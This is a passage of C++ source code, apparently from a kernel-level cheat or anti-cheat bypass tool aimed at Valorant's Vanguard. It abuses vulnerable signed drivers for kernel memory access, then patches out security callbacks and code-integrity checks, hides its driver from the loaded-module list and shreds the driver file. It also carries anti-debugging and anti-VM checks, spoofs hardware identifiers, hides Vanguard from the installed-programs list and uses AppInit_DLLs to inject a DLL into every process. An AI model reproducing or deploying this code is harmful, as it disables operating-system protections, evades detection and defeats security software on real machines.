    "PsSetCreateThreadNotifyRoutine", "PsRemoveCreateThreadNotifyRoutine",
    "PsSetCreateProcessNotifyRoutineEx",
    "CmRegisterCallback", "CmUnRegisterCallback", "CmRegisterCallbackEx",
    "IoRegisterShutdownNotification", "IoUnregisterShutdownNotification",
    "SeRegisterImageVerificationCallback",
    "PsSetSystemProcessStartRoutine"
};

const char* g_validKeys[] = {"4mZp9QxW2vTL", NULL};

HANDLE OpenDrv() {
    const char* dosPaths[] = { "\\\\.\\BiosToolCommonDriver", "\\\\.\\cpqsysio" };
    for (auto dp : dosPaths) {
        HANDLE h = g_k32.CreateFileA(dp, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) return h;
    }
    return INVALID_HANDLE_VALUE;
}

// Probe supported IOCTL format - tries multiple codes and struct formats
int ProbeIOCTL() {
    if (g_hDrv == INVALID_HANDLE_VALUE) return -1;
    DWORD r = 0, le = 0;
    BYTE test[256] = {0};
    // IOCTL codes to try (common vulnerable driver codes)
    DWORD codes[] = {0x22200C, 0x222010, 0x28002024, 0x28002028, 0x220000, 0x220004, 0x80802000, 0x80802004};
    
    // Format 1: RW_REQ {ULONG_PTR Addr, PVOID Buf, ULONG Size} - out via same struct
    for (int ci = 0; ci < 8; ci++) {
        ZeroMemory(test, sizeof(test));
        RW_REQ qf1 = {0xF0000, test, 4};
        if (g_k32.DeviceIoControl(g_hDrv, codes[ci], &qf1, sizeof(qf1), &qf1, sizeof(qf1), &r, NULL)) {
            if (r > 0) { g_ioctlCode = codes[ci]; return 1; }
        } else { le = GetLastError(); }
    }
    
    // Format 2: {ULONG Addr, ULONG Size} - raw data output
    for (int ci = 0; ci < 8; ci++) {
        ZeroMemory(test, sizeof(test));
        struct { ULONG A; ULONG S; } qf2 = {0xF0000, 4};
        if (g_k32.DeviceIoControl(g_hDrv, codes[ci], &qf2, sizeof(qf2), test, sizeof(test), &r, NULL)) {
            if (r > 0) { g_ioctlCode = codes[ci]; return 2; }
        } else { le = GetLastError(); }
    }
    
    // Format 3: {ULONG Addr, ULONG Size, PVOID Buf}
    for (int ci = 0; ci < 8; ci++) {
        ZeroMemory(test, sizeof(test));
        struct { ULONG A; ULONG S; PVOID B; } qf3 = {0xF0000, 4, test};
        if (g_k32.DeviceIoControl(g_hDrv, codes[ci], &qf3, sizeof(qf3), test, sizeof(test), &r, NULL)) {
            if (r > 0) { g_ioctlCode = codes[ci]; return 3; }
        } else { le = GetLastError(); }
    }
    
    // Format 4: {DWORD Addr, DWORD Size, DWORD_PTR Buf} - 32-bit addr style
    for (int ci = 0; ci < 8; ci++) {
        ZeroMemory(test, sizeof(test));
        struct { DWORD A; DWORD S; DWORD_PTR B; } qf4 = {0xF0000, 4, (DWORD_PTR)test};
        if (g_k32.DeviceIoControl(g_hDrv, codes[ci], &qf4, sizeof(qf4), test, sizeof(test), &r, NULL)) {
            if (r > 0) { g_ioctlCode = codes[ci]; return 4; }
        } else { le = GetLastError(); }
    }
    
    printf("[IOCTL] LastError=%d\n", le);
    return -1;
}

bool RD(ULONG_PTR a, PVOID b, ULONG s) {
    DWORD r = 0;
    if (g_ioctlMode == 0) return false;
    DWORD code = g_ioctlCode ? g_ioctlCode : IOCTL_VIRT_READ;
    if (g_ioctlMode == 1) {
        RW_REQ q = {a, b, s};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), &q, sizeof(q), &r, NULL) != 0;
    } else if (g_ioctlMode == 2) {
        struct { ULONG A; ULONG S; } q = {(ULONG)a, s};
        BYTE tmp[4096]; if (s > sizeof(tmp)) return false;
        if (!g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), tmp, s, &r, NULL)) return false;
        memcpy(b, tmp, r < s ? r : s); return true;
    } else if (g_ioctlMode == 3) {
        struct { ULONG A; ULONG S; PVOID B; } q = {(ULONG)a, s, b};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), b, s, &r, NULL) != 0;
    } else if (g_ioctlMode == 4) {
        struct { DWORD A; DWORD S; DWORD_PTR B; } q = {(DWORD)a, s, (DWORD_PTR)b};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), b, s, &r, NULL) != 0;
    }
    return false;
}

bool WR(ULONG_PTR a, PVOID b, ULONG s) {
    DWORD r = 0;
    if (g_ioctlMode == 0) return false;
    DWORD code = g_ioctlCode ? g_ioctlCode+4 : IOCTL_VIRT_WRITE;
    if (g_ioctlMode == 1) {
        RW_REQ q = {a, b, s};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), &q, sizeof(q), &r, NULL) != 0;
    } else if (g_ioctlMode == 2) {
        struct { ULONG A; ULONG S; } q = {(ULONG)a, s};
        BYTE tmp[4096]; if (s > sizeof(tmp)) return false;
        memcpy(tmp, b, s);
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), tmp, s, &r, NULL) != 0;
    } else if (g_ioctlMode == 3) {
        struct { ULONG A; ULONG S; PVOID B; } q = {(ULONG)a, s, b};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), b, s, &r, NULL) != 0;
    } else if (g_ioctlMode == 4) {
        struct { DWORD A; DWORD S; DWORD_PTR B; } q = {(DWORD)a, s, (DWORD_PTR)b};
        return g_k32.DeviceIoControl(g_hDrv, code, &q, sizeof(q), b, s, &r, NULL) != 0;
    }
    return false;
}

ULONG_PTR Fnd(const char* t) {
    auto NtQSI=(pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!NtQSI) return 0;
    ULONG len=0; NtQSI(11,NULL,0,&len); if(!len) return 0;
    std::vector<BYTE> buf(len+0x1000);
    if(!NT_SUCCESS(NtQSI(11,buf.data(),(ULONG)buf.size(),&len))) return 0;
    auto smi=(RTL_PROCESS_MODULES*)buf.data();
    for(ULONG i=0;i<smi->NumberOfModules;i++){auto& m=smi->Modules[i];char* fn=(char*)m.FullPathName+m.OffsetToFileName;if(_stricmp(fn,t)==0) return (ULONG_PTR)m.ImageBase;}
    return 0;
}

ULONG_PTR Exp(const char* n) {
    if(!g_ntBase) return 0;
    IMAGE_DOS_HEADER ds={0}; if(!RD(g_ntBase,&ds,sizeof(ds))||ds.e_magic!=IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt={0}; if(!RD(g_ntBase+ds.e_lfanew,&nt,sizeof(nt))||nt.Signature!=IMAGE_NT_SIGNATURE) return 0;
    ULONG_PTR er=nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if(!er) return 0;
    IMAGE_EXPORT_DIRECTORY ed={0}; if(!RD(g_ntBase+er,&ed,sizeof(ed))) return 0;
    if(ed.NumberOfNames>0xFFFF||ed.NumberOfFunctions>0xFFFF) return 0;
    std::vector<ULONG> na(ed.NumberOfNames),od(ed.NumberOfNames),fn(ed.NumberOfFunctions);
    if(!RD(g_ntBase+ed.AddressOfNames,na.data(),ed.NumberOfNames*4)) return 0;
    if(!RD(g_ntBase+ed.AddressOfNameOrdinals,od.data(),ed.NumberOfNames*4)) return 0;
    if(!RD(g_ntBase+ed.AddressOfFunctions,fn.data(),ed.NumberOfFunctions*4)) return 0;
    for(DWORD i=0;i<ed.NumberOfNames;i++){char buf[256]={0};if(!RD(g_ntBase+na[i],buf,255)) continue;if(strcmp(buf,n)==0&&od[i]<ed.NumberOfFunctions) return g_ntBase+fn[od[i]];}
    return 0;
}

ULONG_PTR FindKernelModule(const char* name) {
    auto NtQSI=(pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!NtQSI) return 0;
    ULONG len=0; NtQSI(11,NULL,0,&len); if(!len) return 0;
    std::vector<BYTE> buf(len+0x1000);
    if(!NT_SUCCESS(NtQSI(11,buf.data(),(ULONG)buf.size(),&len))) return 0;
    auto smi=(RTL_PROCESS_MODULES*)buf.data();
    for(ULONG i=0;i<smi->NumberOfModules;i++){auto& m=smi->Modules[i];char* fn=(char*)m.FullPathName+m.OffsetToFileName;if(_stricmp(fn,name)==0) return (ULONG_PTR)m.ImageBase;}
    return 0;
}

ULONG_PTR ExpModule(ULONG_PTR modBase,const char* name) {
    if(!modBase) return 0;
    IMAGE_DOS_HEADER ds={0}; if(!RD(modBase,&ds,sizeof(ds))||ds.e_magic!=IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt={0}; if(!RD(modBase+ds.e_lfanew,&nt,sizeof(nt))||nt.Signature!=IMAGE_NT_SIGNATURE) return 0;
    ULONG_PTR er=nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if(!er) return 0;
    IMAGE_EXPORT_DIRECTORY ed={0}; if(!RD(modBase+er,&ed,sizeof(ed))) return 0;
    if(ed.NumberOfNames>0xFFFF||ed.NumberOfFunctions>0xFFFF) return 0;
    std::vector<ULONG> na(ed.NumberOfNames),od(ed.NumberOfNames),fn(ed.NumberOfFunctions);
    if(!RD(modBase+ed.AddressOfNames,na.data(),ed.NumberOfNames*4)) return 0;
    if(!RD(modBase+ed.AddressOfNameOrdinals,od.data(),ed.NumberOfNames*4)) return 0;
    if(!RD(modBase+ed.AddressOfFunctions,fn.data(),ed.NumberOfFunctions*4)) return 0;
    for(DWORD i=0;i<ed.NumberOfNames;i++){char buf[256]={0};if(!RD(modBase+na[i],buf,255)) continue;if(strcmp(buf,name)==0&&od[i]<ed.NumberOfFunctions) return modBase+fn[od[i]];}
    return 0;
}

bool KernelAntiDebugCheck() {
    if (g_hDrv == INVALID_HANDLE_VALUE) return false;
    ULONG_PTR kdEn = Exp("KdDebuggerEnabled");
    ULONG_PTR kdNp = Exp("KdDebuggerNotPresent");
    bool detected = false;
    if (kdEn) { BYTE v = 0; if (RD(kdEn, &v, 1) && v != 0) detected = true; }
    if (kdNp) { BYTE v = 1; if (RD(kdNp, &v, 1) && v == 0) detected = true; }
    return detected;
}

// PEB-based anti-debug - catches debuggers IsDebuggerPresent miss
bool PEB_AntiDebug() {
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (!peb) return true;
    if (*peb & 0xFF) return false;
    ULONG ntGlobalFlag = *(ULONG*)(peb + 0x68);
    if (ntGlobalFlag != 0) return false;
    BYTE* heap = *(BYTE**)(peb + 0x30);
    if (heap) {
        ULONG heapFlags = *(ULONG*)(heap + 0x70);
        if ((heapFlags & 0xFFFF) != 2 && (heapFlags & 0xFFFF) != 0x4002) return false;
    }
    return true;
}

// Anti-sandbox - runs if executed
bool AntiSandbox() {
    SYSTEM_INFO si = {0}; g_k32.GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return false;
    __int64 t1 = __rdtsc(); g_k32.Sleep(50);
    __int64 t2 = __rdtsc();
    if ((t2 - t1) > POLY_TIMING * 10) return false;
    return true;
}

volatile bool g_hbRunning = true;
char g_myKey[128] = {0};

DWORD WINAPI HeartbeatThread(LPVOID);
void AntiDump();
void MakeMitmSig(const char* data, char* out);
void GenNonce(char* out, int len);
const char* ExtractJsonStr(const char* json, const char* field, char* out, int outLen);
bool VerifySig(const char* resp, const char* action);

void PatchCallbacks() {
    for(int i=0;i<sizeof(g_targets)/sizeof(g_targets[0]);i++){
        ULONG_PTR a=Exp(g_targets[i]);
        if(a){BYTE p[8]={0x48,0x31,0xC0,0xC3,0x90,0x90,0x90,0x90};WR(a,p,8);}
    }
}

bool HideDriver(ULONG_PTR drvBase) {
    ULONG_PTR psm=Exp("PsLoadedModuleList");
    if(!psm) return false;
    ULONG_PTR listHead=0; if(!RD(psm,&listHead,sizeof(listHead))||!listHead) return false;
    ULONG_PTR current=0; if(!RD(listHead,&current,sizeof(current))) return false;
    while(current&&current!=listHead){
        ULONG_PTR entryBase=0; if(!RD(current+0x30,&entryBase,sizeof(entryBase))) return false;
        if(entryBase==drvBase){
            ULONG_PTR flink=0,blink=0;
            if(!RD(current,&flink,sizeof(flink))) return false;
            if(!RD(current+8,&blink,sizeof(blink))) return false;
            WR(blink,&flink,sizeof(flink)); WR(flink+8,&blink,sizeof(blink));
            BYTE z[0x100]={0}; WR(current-0x30,z,0x100);
            return true;
        }
        ULONG_PTR next=0; if(!RD(current,&next,sizeof(next))) return false;
        current=next;
    }
    return false;
}

bool Sc(const std::string& c){return system(("sc.exe "+c+" >nul 2>&1").c_str())==0;}

bool LoadDriverViaSc(const char* driverPath){
    const char* sn = GetSvcName();
    Sc(std::string("stop ") + sn); g_k32.Sleep(300);
    Sc(std::string("delete ") + sn); g_k32.Sleep(2000);
    if(!Sc(std::string("create ") + sn + " binPath= \"" + std::string(driverPath) + "\" type= kernel")) return false;
    return Sc(std::string("start ") + sn);
}

void CleanupDriverFile(const char* path){
    HANDLE hF=g_k32.CreateFileA(path,GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    if(hF&&hF!=INVALID_HANDLE_VALUE){
        BYTE zero[4096]={0}; DWORD w;
        for(int i=0;i<32;i++) g_k32.WriteFile(hF,zero,sizeof(zero),&w,NULL);
        g_k32.SetFilePointer(hF,0,NULL,FILE_BEGIN); g_k32.SetEndOfFile(hF);
        g_k32.CloseHandle(hF);
    }
    g_k32.DeleteFileA(path);
}

void CleanupCrashFlag(){
    HKEY hKey;
    if(g_reg.Open(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,KEY_SET_VALUE,&hKey)==ERROR_SUCCESS){
        DWORD val=0; g_reg.Set(hKey,"EnableCursorSuppression",0,REG_DWORD,(BYTE*)&val,sizeof(val)); g_reg.Close(hKey);
    }
}

void SetCrashFlag(){
    HKEY hKey;
    if(g_reg.Open(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,KEY_SET_VALUE,&hKey)==ERROR_SUCCESS){
        DWORD val=0xDB; g_reg.Set(hKey,"EnableCursorSuppression",0,REG_DWORD,(BYTE*)&val,sizeof(val)); g_reg.Close(hKey);
    }
}

void PatchCi(){
    ULONG_PTR ciBase=FindKernelModule("ci.dll");
    if(!ciBase) return;
    const char* ciTargets[]={"CiInitialize","CiValidateImageData"};
    for(int t=0;t<2;t++){
        ULONG_PTR addr=ExpModule(ciBase,ciTargets[t]);
        if(addr){BYTE p[]={0x48,0x31,0xC0,0xC3};WR(addr,p,sizeof(p));}
    }
}

void KillProcess(const char* name){
    HANDLE snap=g_k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap==INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe={sizeof(pe)};
    if(g_k32.Process32First(snap,&pe)){do{if(_stricmp(pe.szExeFile,name)==0){HANDLE hp=g_k32.OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);if(hp){g_k32.TerminateProcess(hp,0);g_k32.CloseHandle(hp);}}}while(g_k32.Process32Next(snap,&pe));}
    g_k32.CloseHandle(snap);
}

void Shutdown(){
    if(g_hDrv!=INVALID_HANDLE_VALUE){g_k32.CloseHandle(g_hDrv);g_hDrv=INVALID_HANDLE_VALUE;}
    const char* sn = GetSvcName();
    Sc(std::string("stop ") + sn); g_k32.Sleep(300);
    Sc(std::string("delete ") + sn);
    CleanupCrashFlag();
}

// --- Protection: ThreadHideFromDebugger ---
void HideFromDebugger() {
    auto NtSetInfo = (NTSTATUS(NTAPI*)(HANDLE,DWORD,PVOID,DWORD))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread");
    if (NtSetInfo) NtSetInfo(GetCurrentThread(), 0x11, NULL, 0);
}

// --- Protection: Hardware breakpoint scan ---
bool CheckHWBreakpoints() {
    CONTEXT ctx = { CONTEXT_DEBUG_REGISTERS };
    HANDLE ht = GetCurrentThread();
    auto NtGetCtx = (NTSTATUS(NTAPI*)(HANDLE,PCONTEXT))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetContextThread");
    if (!NtGetCtx || NtGetCtx(ht, &ctx) < 0) return false;
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

// --- Protection: INT 3 scan at patch targets ---
bool CheckInt3Patches() {
    auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return false;
    ULONG len = 0; NtQSI(11, NULL, 0, &len); if (!len) return false;
    std::vector<BYTE> buf(len + 0x1000);
    if (!NT_SUCCESS(NtQSI(11, buf.data(), (ULONG)buf.size(), &len))) return false;
    auto smi = (RTL_PROCESS_MODULES*)buf.data();
    for (ULONG i = 0; i < smi->NumberOfModules; i++) {
        auto& m = smi->Modules[i];
        char* fn = (char*)m.FullPathName + m.OffsetToFileName;
        if (_stricmp(fn, "ntoskrnl.exe") == 0) {
            BYTE* base = (BYTE*)m.ImageBase;
            for (DWORD off = 0; off < 0x100000; off += 0x100) {
                BYTE chunk[256]; DWORD r = 0;
                if (!g_hDrv || g_hDrv == INVALID_HANDLE_VALUE) break;
                RW_REQ q = {(ULONG_PTR)(base + off), chunk, sizeof(chunk)};
                if (!g_k32.DeviceIoControl(g_hDrv, IOCTL_VIRT_READ, &q, sizeof(q), &q, sizeof(q), &r, NULL)) break;
                for (int j = 0; j < sizeof(chunk); j++) if (chunk[j] == 0xCC) return true;
            }
            break;
        }
    }
    return false;
}

// --- Protection: VM detection ---
bool DetectVM() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return true;  // Hypervisor present
    char vmStr[13] = {0};
    __cpuid(cpuInfo, 0x40000000);
    memcpy(vmStr, cpuInfo + 1, 12);
    const char* vmSigs[] = {"VMware", "VBox", "KVM", "Xen", "Microsoft", "Parallels"};
    for (int i = 0; i < 6; i++) if (strstr(vmStr, vmSigs[i])) return true;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[256] = {0}; DWORD sz = sizeof(buf);
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (BYTE*)buf, &sz) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            if (strstr(buf, "VMware") || strstr(buf, "VBOX")) return true;
        } else RegCloseKey(hKey);
    }
    return false;
}

// --- Protection: RDTSC timing trap ---
bool TimingTrap() {
    volatile ULONG64 t1 = __rdtsc();
    for (volatile int i = 0; i < 100; i++) { volatile ULONG64 dummy = __rdtsc(); dummy ^= dummy; }
    volatile ULONG64 t2 = __rdtsc();
    ULONG64 diff = t2 - t1;
    return diff < 100000000ULL;  // Too slow = debugger stepping
}

// --- Protection: HWID spoof via driver ---
void SpoofHWID() {
    if (g_hDrv == INVALID_HANDLE_VALUE) return;
    printf("%s", DE(_e_hwidSpf));
    srand((unsigned)(GetTickCount64() ^ 0xDEADBEEF));
    
    // --- 1. SMBIOS physical memory spoof ---
    // Search for _SM_ signature in wider range (legacy 0xF0000 + ACPI 0xE0000)
    ULONG_PTR smbAddr = 0;
    for (ULONG_PTR addr = 0xE0000; addr < 0x100000; addr += 16) {
        BYTE sig[4] = {0};
        if (!RD(addr, sig, 4)) continue;
        if (sig[0] == '_' && sig[1] == 'S' && sig[2] == 'M' && sig[3] == '_') { smbAddr = addr; break; }
    }
    if (smbAddr) {
        BYTE ep[32] = {0};
        if (RD(smbAddr, ep, 32)) {
            BYTE major = ep[6], minor = ep[7];
            ULONG_PTR tblAddr = 0; ULONG tblLen = 0;
            if (major >= 3) { tblAddr = *(ULONG_PTR*)(ep + 16); tblLen = *(ULONG*)(ep + 24); }
            else { tblAddr = *(ULONG*)(ep + 4); tblLen = *(USHORT*)(ep + 2); }
            if (tblAddr && tblLen && tblLen <= 0x10000) {
                std::vector<BYTE> tbl(tblLen);
                if (RD(tblAddr, tbl.data(), tblLen)) {
                    size_t off = 0;
                    while (off < tblLen - 1) {
                        BYTE type = tbl[off], len = tbl[off + 1];
                        if (len < 4 || off + len > tblLen) break;
                        if (type <= 3) {
                            BYTE strIdx = tbl[off + 7];
                            if (strIdx > 0) {
                                size_t strStart = off + len;
                                size_t cnt = 1; size_t pos = strStart;
                                while (pos < tblLen && cnt < strIdx) {
                                    if (tbl[pos] == 0) { cnt++; if (pos + 1 < tblLen && tbl[pos + 1] == 0) break; }
                                    pos++;
                                }
                                if (cnt == strIdx && pos < tblLen) {
                                    size_t slen = strlen((char*)&tbl[pos]);
                                    if (slen > 0 && slen < 64) {
                                        char ns[64]; sprintf_s(ns, "SN%08X%04X", (unsigned)GetTickCount64(), rand() & 0xFFFF);
                                        for (size_t k = 0; k < slen && k < strlen(ns); k++) tbl[pos + k] = ns[k];
                                        WR(tblAddr + pos, &tbl[pos], (ULONG)slen);
                                    }
                                }
                            }
                            if (type == 1 && len >= 0x19) {
                                BYTE uuid[16]; for (int i = 0; i < 16; i++) uuid[i] = (BYTE)(rand() & 0xFF);
                                uuid[6] = (uuid[6] & 0x0F) | 0x40;
                                uuid[8] = (uuid[8] & 0x3F) | 0x80;
                                WR(tblAddr + off + 8, uuid, 16);
                            }
                        }
                        size_t next = off + len;
                        while (next < tblLen - 1) {
                            if (tbl[next] == 0 && tbl[next + 1] == 0) { off = next + 2; break; }
                            next++;
                        }
                        if (next >= tblLen - 1) break;
                    }
                }
            }
        }
    }
    
    // --- 2. Registry: SMBIOS data ---
    char fakeSN[64]; sprintf_s(fakeSN, "SN%08X%04X", (unsigned)GetTickCount64(), rand() & 0xFFFF);
    char fakeUUID[64]; sprintf_s(fakeUUID, "%08X-%04X-%04X-%04X-%04X%08X", rand(), rand() & 0xFFFF, rand() & 0xFFFF, rand() & 0xFFFF, rand() & 0xFFFF, rand());
    
    struct { const char* path; const char* name; const char* val; } regs[] = {
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSerialNumber", fakeSN},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardSerialNumber", fakeSN},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemUUID", fakeUUID},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemSKU", "SKU-FAKE"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName", "PROD-FAKE-99"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct", "MB-FAKE-99"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion", "FAKE-BIOS-2.0"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate", "01/01/2026"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor", "FAKE Vendor"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer", "FAKE MFG"},
        {"HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer", "FAKE MFG"},
    };
    for (auto& r : regs) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, r.path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, r.name, 0, REG_SZ, (const BYTE*)r.val, (DWORD)strlen(r.val) + 1);
            RegCloseKey(hKey);
        }
    }
    
    // --- 3. MachineGUID spoof ---
    HKEY hKey;
    char mg[64]; sprintf_s(mg, "%08X-%04X-%04X-%04X-%04X%08X", rand(), rand() & 0xFFFF, rand() & 0xFFFF, rand() & 0xFFFF, rand() & 0xFFFF, rand());
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MachineGuid", 0, REG_SZ, (const BYTE*)mg, (DWORD)strlen(mg) + 1);
        RegCloseKey(hKey);
    }
    
    // --- 4. Disk serial ---
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = (DWORD)(rand() ^ 0xDEADBEEF);
        RegSetValueExA(hKey, "SerialNumber", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    
    // --- 5. MAC spoof ---
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}", 0, KEY_ENUMERATE_SUB_KEYS, &hKey) == ERROR_SUCCESS) {
        for (int i = 0; ; i++) {
            char sub[128]; DWORD sz = sizeof(sub);
            if (RegEnumKeyExA(hKey, i, sub, &sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            char path[256]; sprintf_s(path, "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\%s", sub);
            HKEY hSub;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hSub) == ERROR_SUCCESS) {
                char mac[13]; sprintf_s(mac, "02%02X%02X%02X%02X%02X", rand() & 0xFF, rand() & 0xFF, rand() & 0xFF, rand() & 0xFF, rand() & 0xFF);
                RegSetValueExA(hSub, "NetworkAddress", 0, REG_SZ, (BYTE*)mac, 13);
                RegCloseKey(hSub);
            }
        }
        RegCloseKey(hKey);
    }
    
    // --- 6. Product ID / Volume serial ---
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char pid[64]; sprintf_s(pid, "FAKE-PID-%08X", rand());
        RegSetValueExA(hKey, "ProductId", 0, REG_SZ, (BYTE*)pid, (DWORD)strlen(pid) + 1);
        RegCloseKey(hKey);
    }
    
    // --- 7. Delete Riot client cache ---
    char tmpPath[MAX_PATH] = {0};
    GetEnvironmentVariableA("LOCALAPPDATA", tmpPath, MAX_PATH);
    strcat_s(tmpPath, "\\Riot Games\\Riot Client\\Data");
    SHFILEOPSTRUCTA fo = {0};
    fo.wFunc = FO_DELETE;
    fo.pFrom = tmpPath;
    fo.fFlags = FOF_NO_UI | FOF_SILENT;
    SHFileOperationA(&fo);
    
    strcpy_s(tmpPath, MAX_PATH - 1, "");
    GetEnvironmentVariableA("PROGRAMDATA", tmpPath, MAX_PATH);
    strcat_s(tmpPath, "\\Riot Games\\Riot Client\\Data");
    fo.pFrom = tmpPath;
    fo.wFunc = FO_DELETE;
    fo.fFlags = FOF_NO_UI | FOF_SILENT;
    SHFileOperationA(&fo);
    
    printf(" [DONE]");
}

void HideVanguard() {
    // Vanguard'ı Apps & Features'ten gizle: SystemComponent=1 yap
    const char* uninstallPaths[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    };
    for (int p = 0; p < 2; p++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, uninstallPaths[p], 0, KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            for (int i = 0; ; i++) {
                char sub[256]; DWORD sz = sizeof(sub);
                if (RegEnumKeyExA(hKey, i, sub, &sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
                HKEY hSub;
                if (RegOpenKeyExA(hKey, sub, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hSub) == ERROR_SUCCESS) {
                    char disp[64]; DWORD dsz = sizeof(disp); DWORD type = 0;
                    if (RegQueryValueExA(hSub, "DisplayName", NULL, &type, (BYTE*)disp, &dsz) == ERROR_SUCCESS && type == REG_SZ) {
                        if (strstr(disp, "Vanguard") || strstr(disp, "Riot")) {
                            DWORD one = 1;
                            RegSetValueExA(hSub, "SystemComponent", 0, REG_DWORD, (BYTE*)&one, sizeof(one));
                            // Also remove from Programs list entirely
                            RegDeleteValueA(hSub, "DisplayName");
                            RegDeleteValueA(hSub, "UninstallString");
                            RegDeleteValueA(hSub, "DisplayIcon");
                        }
                    }
                    RegCloseKey(hSub);
                }
            }
            RegCloseKey(hKey);
        }
    }
}

// --- VALORANT VGC check memory patch (friend's method) ---
// Set AppInit_DLLs registry so vghook.dll loads automatically in ALL new processes
static void SetAppInitDlls(const char* dllPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (const BYTE*)dllPath, (DWORD)strlen(dllPath) + 1);
        DWORD one = 1;
        RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&one, sizeof(one));
        RegCloseKey(hKey);
    }
}

static void ClearAppInitDlls() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        const char* empty = "";
        RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (const BYTE*)empty, 1);
        DWORD zero = 0;
